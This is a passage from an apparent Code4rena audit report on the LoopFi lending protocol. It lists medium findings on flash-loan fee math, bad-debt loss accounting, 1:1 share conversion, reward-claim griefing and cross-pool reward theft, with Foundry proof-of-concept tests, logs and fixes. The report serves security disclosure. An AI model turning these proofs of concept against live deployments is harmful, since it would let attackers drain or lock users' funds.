        vault.setPermissionAgent(address(bobProxy), true);

        // now call decreaseLever on alice's position as bob and expect success because alice gave bob permission
        vm.prank(bob);
        vm.expectRevert();
        bobProxy.execute(
            address(positionAction),
            abi.encodeWithSelector(positionAction.decreaseLever.selector, leverParams, maxAmountIn, address(bob))
        );

        printPosition(vault, address(aliceProxy), "AliceProxy"); 
    }
}
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Correct the two functions as follows, focusing on calculating the correct `loanAmount` and `subDebt` and `returnAmount`:

<details>

```javascript
function decreaseLever(
        LeverParams calldata leverParams,
        uint256 subCollateral,
        address residualRecipient
    ) external onlyDelegatecall {
        // validate the primary swap
        if (leverParams.primarySwap.swapType != SwapType.EXACT_OUT || leverParams.primarySwap.recipient != self)
            revert PositionAction__decreaseLever_invalidPrimarySwap();

        // validate aux swap if it exists
        if (leverParams.auxSwap.assetIn != address(0) && (leverParams.auxSwap.swapType != SwapType.EXACT_IN))
            revert PositionAction__decreaseLever_invalidAuxSwap();

        /// validate residual recipient is provided if no aux swap is provided
        if (leverParams.auxSwap.assetIn == address(0) && residualRecipient == address(0))
            revert PositionAction__decreaseLever_invalidResidualRecipient();

        // take out credit flash loan
        IPermission(leverParams.vault).modifyPermission(leverParams.position, self, true);

        uint protocolFee = flashlender.protocolFee();
        // loanAmount (WAD + protocolFee)/WAD = leverParams.primarySwap.amount
        uint loanAmount = leverParams.primarySwap.amount * (10**18) / (10**18 + protocolFee);  // loanamount should be smaller

        flashlender.creditFlashLoan(
            ICreditFlashBorrower(self),
            loanAmount,
            abi.encode(leverParams, subCollateral, residualRecipient)
        );
        IPermission(leverParams.vault).modifyPermission(leverParams.position, self, false);
    }


 function onCreditFlashLoan(
        address /*initiator*/,
        uint256 /*amount*/,
        uint256 /*fee*/,
        bytes calldata data
    ) external returns (bytes32) {
        if (msg.sender != address(flashlender)) revert PositionAction__onCreditFlashLoan__invalidSender();
        (
            LeverParams memory leverParams,
            uint256 subCollateral,
            address residualRecipient
        ) = abi.decode(data,(LeverParams, uint256, address));

        uint protocolFee = flashlender.protocolFee();
        // loanAmount (WAD + protocolFee)/WAD = leverParams.primarySwap.amount
        uint loanAmount = leverParams.primarySwap.amount * (10**18) / (10**18 + protocolFee);  // loanamount should be smaller


        underlyingToken.forceApprove(address(leverParams.vault), loanAmount); //  // should be equal to loanAmount
        // sub collateral and debt
        ICDPVault(leverParams.vault).modifyCollateralAndDebt(
            leverParams.position,
            address(this),
            address(this),
            0,
            -toInt256(loanAmount)        // should be equal to loanAmount
        );

        // withdraw collateral and handle any CDP specific actions
        uint256 withdrawnCollateral = _onDecreaseLever(leverParams, subCollateral);

        bytes memory swapData = _delegateCall(
            address(swapAction),
            abi.encodeWithSelector(
                swapAction.swap.selector,
                leverParams.primarySwap
            )
        );
        uint256 swapAmountIn = abi.decode(swapData, (uint256));

        // swap collateral to stablecoin and calculate the amount leftover
        uint256 residualAmount = withdrawnCollateral - swapAmountIn;

        // send left over collateral that was not needed to payback the flash loan to `residualRecipient`
        if (residualAmount > 0) {

            // perform swap from collateral to arbitrary token if necessary
            if (leverParams.auxSwap.assetIn != address(0)) {
                _delegateCall(
                    address(swapAction),
                    abi.encodeWithSelector(
                        swapAction.swap.selector,
                        leverParams.auxSwap
                    )
                );
            } else {
                // otherwise just send the collateral to `residualRecipient`
                IERC20(leverParams.primarySwap.assetIn).safeTransfer(residualRecipient, residualAmount);
            }
        }

        underlyingToken.forceApprove(address(flashlender), leverParams.primarySwap.amount); // returnAmoutn is the output amount of the swap

        return CALLBACK_SUCCESS_CREDIT;
    }
```

</details>

### Assessed type

Math

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/191#event-14337581991)**

***

## [[M-18] In `CDPVault::liquidatePositionBadDebt()`, the calculation of `loss` is incorrect](https://github.com/code-423n4/2024-07-loopfi-findings/issues/190)
*Submitted by [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/190), also found by [lanrebayode77](https://github.com/code-423n4/2024-07-loopfi-findings/issues/434), [crypticdefense](https://github.com/code-423n4/2024-07-loopfi-findings/issues/394), [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/316), and [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/96)*

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L579>

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L735>

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509>

### Impact

The incorrect calculation affects the protocol’s profit assessment, resulting in potential losses for users, particularly in the interest portion.

### Proof of Concept

```javascript
    function liquidatePositionBadDebt(address owner, uint256 repayAmount) external whenNotPaused {
        // validate params
        if (owner == address(0) || repayAmount == 0) revert CDPVault__liquidatePosition_invalidParameters();

        // load configs
        VaultConfig memory config = vaultConfig;
        LiquidationConfig memory liqConfig_ = liquidationConfig;

        // load liquidated position
        Position memory position = positions[owner];
        DebtData memory debtData = _calcDebt(position);
        uint256 spotPrice_ = spotPrice();
        if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice();
        // verify that the position is indeed unsafe
        if (_isCollateralized(calcTotalDebt(debtData), wmul(position.collateral, spotPrice_), config.liquidationRatio))
            revert CDPVault__liquidatePosition_notUnsafe();

        // load price and calculate discounted price
        uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount);
        // Ensure that the debt is greater than the collateral at discounted price
        if (calcTotalDebt(debtData) <= wmul(position.collateral, discountedPrice)) revert CDPVault__noBadDebt();
        // compute collateral to take, debt to repay
        uint256 takeCollateral = wdiv(repayAmount, discountedPrice);
        if (takeCollateral < position.collateral) revert CDPVault__repayAmountNotEnough();

        // account for bad debt
        takeCollateral = position.collateral;
        repayAmount = wmul(takeCollateral, discountedPrice);
    @>>    uint256 loss = calcTotalDebt(debtData) - repayAmount;

        // transfer the repay amount from the liquidator to the vault
        poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount);

        position.cumulativeQuotaInterest = 0;
        position.cumulativeQuotaIndexLU = debtData.cumulativeQuotaIndexNow;
        // update liquidated position
        position = _modifyPosition(
            owner,
            position,
            0,
            debtData.cumulativeIndexNow,
            -toInt256(takeCollateral),
            totalDebt
        );

        pool.repayCreditAccount(debtData.debt, 0, loss); // U:[CM-11]
        // transfer the collateral amount from the vault to the liquidator
        token.safeTransfer(msg.sender, takeCollateral);

        int256 quotaRevenueChange = _calcQuotaRevenueChange(-int(debtData.debt));
        if (quotaRevenueChange != 0) {
            IPoolV3(pool).updateQuotaRevenue(quotaRevenueChange); // U:[PQK-15]
        }
    }
```

In the `liquidatePositionBadDebt` function, the calculation of the loss is done by subtracting the repaid portion of the debt from the total debt.

```javascript
    function calcTotalDebt(DebtData memory debtData) internal pure returns (uint256) {
@>>        return debtData.debt + debtData.accruedInterest; //+ debtData.accruedFees;
    }
```

Through the `calcTotalDebt()` function, we know that the total debt includes both the principal debt and the interest accrued on the debt. In this CDPVault, the interest accrued on the debt is treated as profit. For example, in the `liquidatePosition` function, profit is calculated as `debtData`.`accruedInterest`, and this profit is treated as interest revenue in other functions as well.

```javascript
   function liquidatePosition(address owner, uint256 repayAmount) external whenNotPaused {
        //skip ........
        uint256 newDebt;
        uint256 profit;
        uint256 maxRepayment = calcTotalDebt(debtData);
        uint256 newCumulativeIndex;
        if (deltaDebt == maxRepayment) {
            newDebt = 0;
            newCumulativeIndex = debtData.cumulativeIndexNow;
@>>            profit = debtData.accruedInterest;
            position.cumulativeQuotaInterest = 0;
        } 

        //skip ........
    }
```

Therefore, the loss should only account for the loss of the principal amount. In the `liquidatePositionBadDebt` function, if `repayAmount > debtData.debt`, there would actually be a small profit (`repayAmount - debtData.debt`) instead of a loss. The calculation for the loss should be `debtData.debt - repayAmount` to correctly reflect the loss of the principal portion.

### Recommended Mitigation Steps

Modify the relevant formula for calculating the loss.

### Assessed type

Math

**[0xtj24 (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/190#event-14376839407)**

**[Koolex (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/190#issuecomment-2371028205):**
 > Looks valid. However, this is based on the assumption that loss of revenue is not a loss. Requesting from the Warden to provide further input to support this assumption. only in PJQA please.

**[crypticdefense (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/190#issuecomment-2392218571):**
 > @Koolex, I would like to provide further info as requested (my issue [#394](https://github.com/code-423n4/2024-07-loopfi-findings/issues/394) is a duplicate).
 >
 >The assumption that the `accruedInterest` is not a loss is based off how the protocol itself will burn treasury shares to make up for the loss when there is bad debt. Think about it like this, the `accruedInterest` is the profit the protocol will receive from lending, and if there is bad debt accumulated, that means the `accruedInterest` has *not* been paid.
 >
 > Then, when someone liquidates the bad debt position, they can liquidate it for a discount. Since they are paying at a discount, the full debt cannot be repaid, so the protocol will proceed to cover the rest of the amount of debt by burning treasury shares. The `loss` calculation is as follows: [`position debt + accruedInterest - repayAmount`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L607), where `repayAmount` is the amount paid by the liquidator. However, the protocol never lost `accruedInterest` amount, that is just potential profit from lending that was never received.
> 
> Even if there exists a case where some of the `accruedInterest` was paid by the borrower, that is still profit that the protocol is burning. It should only burn the amount of shares equivalent to the debt owed, because that represents the loss. Profit accumulated is not a loss.
> 
> So the protocol will proceed to [burn `loss` amount of treasury shares](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L550-L563). It is burning extra treasury shares here because it includes `accruedInterest`, causing a range of issues such as DoS due to insufficient shares and incorrect accounting.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/190#issuecomment-2408922363):**
 > Thank you for the additional clarification. The issue stays as-is.

***

## [[M-19] Because of the asset: `Share 1:1 Conversion`, if vault incurs a loss, the last user to withdraw will take the entire loss](https://github.com/code-423n4/2024-07-loopfi-findings/issues/186)
*Submitted by [Infect3d](https://github.com/code-423n4/2024-07-loopfi-findings/issues/186), also found by [zhaojohnson](https://github.com/code-423n4/2024-07-loopfi-findings/issues/457), [Spearmint](https://github.com/code-423n4/2024-07-loopfi-findings/issues/403), [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/388), [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/54), and [nnez](https://github.com/code-423n4/2024-07-loopfi-findings/issues/39)*

Because of the 1:1 conversion rate in `PoolV3`, if the pool incur a loss due to liquidation from borrowed asset through `CDPVault`, last user to withdraw will take the full loss.

### Vulnerability details

Every user should be allowed to withdraw a fair share of what's is available in the vault. But as:

- The exchange rate is [always 1:1 for deposit and withdraw](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L429-L439)
- and losses can happen as the underlying can be borrowed,

There will be situations where the last user to withdraw will not be made whole.

Also, if the last user A is not whole, and another user B deposit to the vault, A can get its missing assets from B deposit and B will be at loss waiting for another deposit.

Scenario:

1. Alice and Bob deposit 10 ETH each to PoolV3, PoolV3 has 20 ETH.
2. Each user receive 10 shares, and there are 20 total shares.
3. Eve deposit collateral to CDPVault and borrow 5 ETH.
4. Eve [get liquidated](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L624), the [loss is 1 ETH ](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L550-L550).
5. [Treasury has 0 remaining assets](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L554) to cover the debt (works also if less than 1 ETH treasury).
6. PoolV3 has now 19 ETH, and Alice and Bob 10 shares each where the exchange rate is 1:1.
7. Alice withdraw 10 ETH with her 10 shares.
8. There's only 9 ETH left for Bob.

```solidity
File: src/PoolV3.sol
529:     function repayCreditAccount(
530:         uint256 repaidAmount,
531:         uint256 profit,
532:         uint256 loss
533:     )
...:
...: // ------- some code ------- //
...:
548:         if (profit > 0) {
549:             _mint(treasury, convertToShares(profit));
550:         } else if (loss > 0) {                         <@(1) //we're in this case when there's a loss
551:             address treasury_ = treasury;
552:             uint256 sharesInTreasury = balanceOf(treasury_);
553:             uint256 sharesToBurn = convertToShares(loss);
554:❌                if (sharesToBurn > sharesInTreasury) { <@(2) //sharesToBurn are capped to sharesInTreasury
555:                 unchecked {
556:                     emit IncurUncoveredLoss({
557:                         creditManager: msg.sender,
558:                         loss: convertToAssets(sharesToBurn - sharesInTreasury)
559:                     });
560:                 }
561:❌                     sharesToBurn = sharesInTreasury; <@(2) 
562:             }
563:❌                _burn(treasury_, sharesToBurn);
564:         }
```

### Impact

Loss of funds for users. Unfair loss distribution among users, as the only last withdrawer will incur the entire loss of the vault

### Proof of Concept

Add this test to `src/test/unit/CDPVault.t.sol`:

<details>

```solidity
     function testAudit_PoolV3LastWithdrawerAtLossWhenBadDebt() public {
        CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 1 ether, 1 ether);
        createGaugeAndSetGauge(address(vault));
          liquidityPool.setLock(false);
          // removing the initial deposit made in setUp() so that PooLV3 is empt
          liquidityPool.withdraw(1_000_000 ether, address(this), address(this));

          address alice = makeAddr("alice");
          address bob = makeAddr("bob");
        address position = address(this);

          address poolUnderlying = liquidityPool.underlyingToken();

          // Alice deposits 50 ETH
          deal(poolUnderlying, alice, 50 ether);
          vm.startPrank(alice);
          IERC20(underlyingToken).approve(address(liquidityPool), 50 ether);
          liquidityPool.deposit(50 ether, alice);
          vm.stopPrank();

          // Bob deposits 50 ETH
          deal(poolUnderlying, bob, 50 ether);
          vm.startPrank(bob);
          IERC20(underlyingToken).approve(address(liquidityPool), 50 ether);
          liquidityPool.deposit(50 ether, bob);
          vm.stopPrank();

          // state after liquidation
          console.log("----------  initial state with borrowed assets ----------");
          console.log("PoolV3 shares balance: %e", liquidityPool.totalSupply());
          console.log("PoolV3 ETH balance: %e", IERC20(poolUnderlying).balanceOf(address(liquidityPool)));

          // Simulating a user depositing 100 collateral and borrowing 80 ETH through CDPVault
        _modifyCollateralAndDebt(vault, 100 ether, 80 ether);

        uint256 virtualDebtBefore = virtualDebt(vault, position);
          console.log("virtualDebt before: %e", virtualDebtBefore);

        vm.warp(block.timestamp + 365 days);

        uint256 virtualDebtAfter = virtualDebt(vault, position);
          console.log("virtualDebt after (accrued interest): %e", virtualDebtAfter);

        // Simulating liquidation of the position and bad debt
          uint256 repayAmount = 80 ether;
        _updateSpot(0.7 ether);
        mockWETH.approve(address(vault), repayAmount);
        vault.liquidatePositionBadDebt(position, repayAmount);

          // state after liquidation
          console.log("\r");
          console.log("----------  state after bad debt liquidation ----------");
          console.log("PoolV3 shares balance: %e", liquidityPool.totalSupply());
          console.log("PoolV3 ETH balance: %e", IERC20(poolUnderlying).balanceOf(address(liquidityPool)));
          console.log("... Still 100 shares in PoolV3, but only 90 ETH left for Alice and Bob ...");

          vm.prank(alice);
          liquidityPool.withdraw(50 ether, alice, alice);

          console.log("\r");
          console.log("----------  state after Alice withdraw ----------");
          console.log("PoolV3 shares balance: %e", liquidityPool.totalSupply());
          console.log("PoolV3 ETH balance: %e", IERC20(poolUnderlying).balanceOf(address(liquidityPool)));
          console.log("... Bob has 50 shares but can only withdraw 40 ETH ...");

          vm.prank(bob);
          vm.expectRevert("SafeCast: value must be positive");
          liquidityPool.withdraw(50 ether, bob, bob);
     }
```

</details>

Logs:

```solidity
Ran 1 test for src/test/unit/CDPVault.t.sol:CDPVaultTest
[PASS] testAudit_collateralDebt() (gas: 3980542)
Logs:
  ----------  initial state with borrowed assets ----------
  PoolV3 shares balance: 1e20
  PoolV3 ETH balance: 1e20
  virtualDebt before: 8e19
  virtualDebt after (accrued interest): 1.03138823529411764705e20

  ----------  state after bad debt liquidation ----------
  PoolV3 shares balance: 1e20
  PoolV3 ETH balance: 9e19
  ... Still 100 shares in PoolV3, but only 90 ETH left for Alice and Bob ...

  ----------  state after Alice withdraw ----------
  PoolV3 shares balance: 5e19
  PoolV3 ETH balance: 4e19
  ... Bob has 50 shares but can only withdraw 40 ETH ...

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.32ms (2.27ms CPU time)
```

### Recommended Mitigation Steps

When there are more shares than assets and vault cannot make all users whole. Withdrawals should be lossy to split loss over all users.

This could be something like this:

```solidity
    /// @dev Internal conversion function (from assets to shares) with support for rounding direction
    /// @dev Pool is not vulnerable to the inflation attack, so the simplified implementation w/o virtual shares is used
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal returns (uint256 shares) {
        uint256 supply = totalSupply();
          if (supply < totalAssets()) {
               shares = (assets == 0 || supply == 0) ? assets : assets.mulDiv(supply, totalAssets(), rounding);
          }
          else {
               shares = assets;
          }
        return shares; 
    }

    /// @dev Internal conversion function (from shares to assets) with support for rounding direction
    /// @dev Pool is not vulnerable to the inflation attack, so the simplified implementation w/o virtual shares is used
    function _convertToAssets(uint256 shares, Math.Rounding rounding) internal returns (uint256 assets) {
        uint256 supply = totalSupply();
          if (supply < totalAssets()) {
               assets = (supply == 0) ? shares : shares.mulDiv(totalAssets(), supply, rounding);
          }
          else {
               assets = shares;
          }
        return assets; 
    }
```

### Assessed type

Math

**[0xtj24 (LoopFi) acknowledged](https://github.com/code-423n4/2024-07-loopfi-findings/issues/186#event-14376854509)**

**[Koolex (judge) decreased severity to Medium](https://github.com/code-423n4/2024-07-loopfi-findings/issues/186#issuecomment-2371036853)**

***

## [[M-20] Honest users could be permanently DOS'd from withdrawing their vested tokens/rewards](https://github.com/code-423n4/2024-07-loopfi-findings/issues/181)
*Submitted by [Bauchibred](https://github.com/code-423n4/2024-07-loopfi-findings/issues/181)*

### Proof of Concept

[`ChefIncentivesController#Claim()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L518) is a public function and callable by anyone. When claiming, there is a need to [vest the tokens](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L546), now this vesting [directly vests to the `multifeedistributor`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L560).

In [`MultiFeeDistribution#vestTokens()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/MultiFeeDistribution.sol#L496-L529), there is a [logic](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/MultiFeeDistribution.sol#L505-L525) to only allow *pushing* a new entry for a user to his `_userEarnings` array once in a day. These rewards are then kept, and then after the vesting period a user can claim their rewards, where the `_userEarnings` array would be looped through.

Now from the links to the necessary functions attached, we can see that there is no minimum claimants to be made, asides the check that `RDNT` must be `>` `0`, however as little as `1` is allowed.

For active users that could earn even if little rewards per day, this then allows a malicious user to cause a permanent DOS to claiming their vested tokens, since all the attacker has to do, is once a day **for as long as the vesting duration query, *which could in valid scenarios be quite lengthy*** query [`ChefIncentivesController#Claim()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L518) while passing the user's address. Then, when the user comes to withdraw their vested tokens, the loop OOG's and then reverts due to the amount of entries in the `_userEarnings` array .

### Impact

Potential permanent DOS to honest users [(or force the users to incur losses since some tech savvy users can notice this griefing attempt, but to stop this they'd have to withdraw early which forces them to incur losses](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/MultiFeeDistribution.sol#L505-L525), since even if the vesting duration reduces there is no other method for the user to withdraw their tokens and it's stuck in the protocol. Alternatively, if the user leaves the claiming of their tokens even after the vesting period and does not immediately withdraw; the chances of this happening heavily increases since with each day an entry to the `_userEarnings` array can be made.

### Recommended Mitigation Steps

Consider introducing some access control to [`ChefIncentivesController#Claim()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L518) and only allow the users call this for themselves.

### Assessed type

DoS

**[amarcu (LoopFi) confirmed and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/181#issuecomment-2363357601):**
 > This is a grieve attack on rewards, the user funds are not at risk.

**[Koolex (judge) decreased severity to Medium](https://github.com/code-423n4/2024-07-loopfi-findings/issues/181#issuecomment-2370735497)**

**[0xAlix2 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/181#issuecomment-2392128291):**
 > @Koolex - I respectfully believe that this is invalid, as vesting tokens is only doable by minters, [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/MultiFeeDistribution.sol#L497C14-L497C21), that are assigned by the contract owner, i.e., trusted. Moreover, a user is allowed to call `claim` on a certain number of reward tokens, so even if DOS exists (it doesn't but assuming minters are malicious) a user can still claim their rewards.

**[Bauchibred (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/181#issuecomment-2394090564):**
 > I do not understand the sponsors [claim above](https://github.com/code-423n4/2024-07-loopfi-findings/issues/181#issuecomment-2363357601) to downgrade the severity of this report. Afaik, in the scope of this audit  rewards are to be considered as users funds. This attack case has a simple path, a malicious user griefs users from their rewards by constantly calling [`ChefIncentivesController#Claim()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L518) so they are forced to incur losses. 
 >
 > This directly puts their assets at risk as they can't access it as expected and why I submitted as High. Since the viable option for the users, which in my opinion, still points this to high is for them to withdraw early and **incur losses**. 
> 
> Also I think @0xAlix2 seems to see the bug case as been backed by _a malicious minter_; however, their claim actually shows how vesting the tokens every day would be what a non-malicious minter would do; since if users are active and earn rewards for that day then there should be no reason why their tokens are not vested for the day which is what he's suggesting. If that's done, then this just breaks the logic as users are not being given their rewards, no?

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/181#issuecomment-2440009044):**
 > Thank you everyone for your input. Given the input above, I believe this is valid and stays as-is.

***

## [[M-21] In `PositionActionPendle::_onDecreaseLever`, `tokenOut` is implemented incorrectly](https://github.com/code-423n4/2024-07-loopfi-findings/issues/160)
*Submitted by [minglei-wang-3570](https://github.com/code-423n4/2024-07-loopfi-findings/issues/160), also found by [zhaojohnson](https://github.com/code-423n4/2024-07-loopfi-findings/issues/448), [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/386), and [0xc0ffEE](https://github.com/code-423n4/2024-07-loopfi-findings/issues/300)*

The function `PositionActionPendle::_onDecreaseLever` is a  hook to decrease lever by withdrawing collateral from the CDPVault. But the current implementation is wrong if `leverParams.auxAction.args.length` is 0, `_onWithdraw` is called here, but the `tokenOut` still returns 0.

```solidity
    function _onDecreaseLever(
        LeverParams memory leverParams,
        uint256 subCollateral
    ) internal override returns (uint256 tokenOut) {
@>      _onWithdraw(leverParams.vault, leverParams.position, address(0), subCollateral);

        if (leverParams.auxAction.args.length != 0) {
            bytes memory exitData = _delegateCall(
                address(poolAction), abi.encodeWithSelector(poolAction.exit.selector, leverParams.auxAction)
            );

@>          tokenOut = abi.decode(exitData, (uint256));
        }
    }
```

The `tokenOut` accounting will be incorrect if the `leverParams.auxAction.args.length` is 0.

### Proof of Concept

We can see that the function [`PositionActionPendle::_onDecreaseLever`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/PositionActionPendle.sol#L76) returns the `tokenOut` on successful withdraw.

```solidity
    function _onDecreaseLever(
        LeverParams memory leverParams,
        uint256 subCollateral
    ) internal override returns (uint256 tokenOut) {
        _onWithdraw(leverParams.vault, leverParams.position, address(0), subCollateral);

        if (leverParams.auxAction.args.length != 0) {
            bytes memory exitData = _delegateCall(
                address(poolAction), abi.encodeWithSelector(poolAction.exit.selector, leverParams.auxAction)
            );

            tokenOut = abi.decode(exitData, (uint256));
        }
    }
```

But in the above implementation, The `tokenOut` accounting will be incorrect if the `leverParams.auxAction.args.length` is 0.

The implementation properly handled in the function [`PositionAction4626::_onDecreaseLever()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/PositionAction4626.sol#L136) as the `tokenOut` is return even if `leverParams.auxAction.args.length` is 0.

```solidity
    function _onDecreaseLever(
        LeverParams memory leverParams,
        uint256 subCollateral
    ) internal override returns (uint256 tokenOut) {
        // withdraw collateral from vault
        uint256 withdrawnCollateral = ICDPVault(leverParams.vault).withdraw(address(this), subCollateral);

        // withdraw collateral from the ERC4626 vault and return underlying assets
@>       tokenOut = IERC4626(leverParams.collateralToken).redeem(withdrawnCollateral, address(this), address(this));

        if (leverParams.auxAction.args.length != 0) {
            bytes memory exitData = _delegateCall(
                address(poolAction),
                abi.encodeWithSelector(poolAction.exit.selector, leverParams.auxAction)
            );

            tokenOut = abi.decode(exitData, (uint256));
        }
    }
```

### Recommended Mitigation Steps

Handle the edge case properly like `PositionAction4626::_onDecreaseLever()` and return `tokenOut` if `leverParams.auxAction.args.length` is 0.

### Assessed type

Token-Transfer

**[amarcu (LoopFi) confirmed and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/160#issuecomment-2360426562):**
 > The flow will always revert because of how the parameters are set. We will make the update to always revert with a custom message for the case where the `auxSwap` is not defined. Maybe this can be re-evaluated as a medium.

**[Koolex (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/160#issuecomment-2371320667):**
 > Medium, since it is an edge case.

***

## [[M-22] Users of a vault can steal other user's rewards when one vault's `lastRewardTime` differs from another vault's `lastRewardTime`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/158)
*Submitted by [rscodes](https://github.com/code-423n4/2024-07-loopfi-findings/issues/158), also found by [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/330), [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/106), and novamanbg ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/13), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/8))*

In `ChefIncentivesController.sol`, the `_newRewards` function calculates the new rewards accumulated since the last update of that specific pool [Line 988-994](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L988-L994):

```solidity
function _newRewards(
    VaultInfo memory pool,
    uint256 _totalAllocPoint
) internal view returns (uint256 newReward, uint256 newAccRewardPerShare) {
    .....
    if (lpSupply > 0) {
->      uint256 duration = block.timestamp - pool.lastRewardTime;
->      uint256 rawReward = duration * rewardsPerSecond;

->      uint256 rewards = availableRewards();
->      if (rewards < rawReward) {
->          rawReward = rewards;
->      }
        .....
    }
}
```

For example, when a user changes his debt in CDPVault, `handleActionAfter` is called by the vault, which only changes the `pool.lastRewardTime` of that individual pool representing that vault through `_updatePool`.

This is problematic as it means different pools can have different `pool.lastRewardTime`, which means the way that rewards are calculated in `_newRewards` will cause one pool to receive more rewards than it is supposed to, at the loss of another pool.

A summary would be that `availableRewards()` returns `depositedRewards - accountedRewards;` and `pool.lastRewardTime` being different means that one pool has been adding to `accountedRewards` and its struct variables ahead of another pool. That one pool should then have a "lesser" share in the value returned by `availableRewards()`; however, the current code does not take that into account, allowing that pool to dig into rewards meant for other pools who has a more outdated `pool.lastRewardTime`.

Consider this symbol diagram example:

```
          [-----A-----|-----B-----]            (pool 1)
          [-----------C-----------]            (pool 2)
    Day:  0           x           y       z
```

Suppose there are 2 pools (represented by the first and second `[]` block respectively) that are eligible for rewards. And `day y` is the value `endRewardTime()` returns. And `day z` is a value larger than `day y`. Part `A` represents the rewards that are to be claimed by pool 1 during the time period `[0,x)`, Part `B` represents `[x,y)` for pool 1 as well, while Part `C` represents the full rewards that are to be claimed by pool 2 during `[0,y)`. Below I will explain the sequence which allows pool 1 to steal `1/4` of part `C` from pool 2.

1. Both pools start accumulating rewards from `day 0`.
2. At `day x`, user in **pool 1** changes his debt (by any amount). This will trigger `_modifyPosition` (in CDPVault.sol) which will call `handleActionAfter` (in ChefIncentiveController.sol).
3. `handleActionAfter` in ChefIncentiveController.sol will call `_updatePool` for pool 1 **only**, adding part A (refer to symbol diagram) into `accountedRewards`. (Through this line `accountedRewards = accountedRewards + reward;` inside `_updatePool`).
4. Now suppose on `day z` (which is **greater** than `day y`), the user in pool 1 tries to `claim`, `claim` will then call `_updatePool` which will then call `_newRewards`.
5. Now lets go through what happens inside [`_newRewards`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L988-L994):
    1. `duration` gets set to `z - pool.lastRewardTime` = `z - x`.
    2. `rawReward` gets set to `duration * rewardsPerSecond`.
    3. `availableRewards()` returns `depositedRewards - accountedRewards`; hence, `availableRewards()` = **part `B+C`** (since `A` is already in `accountedRewards`).
    4. Since `z > y`, `availableRewards()` will be `<` `rawReward` for some values of `z`, this results in the function setting `rawReward = availableRewards();` inside the if statement.
    5. So now, `rawReward` = `availableRewards()` = **part `B+C`**.
    6. Hence, the value returned by `_newRewards` for pool 1 will include **part `C`** which is supposed to be pool 2's rewards; effectively allowing user from pool 1 to **steal a fraction** of another user's rewards from pool 2. (In this scenario, pool 1 can steal `1/4` of part `C`).

### Proof of Code

The below code is the coded version of the explanation above:

<details>

```solidity
function test_durationHack() public {
    rewardsPerSecond = 1 ether;     //changed to make console output more understandable
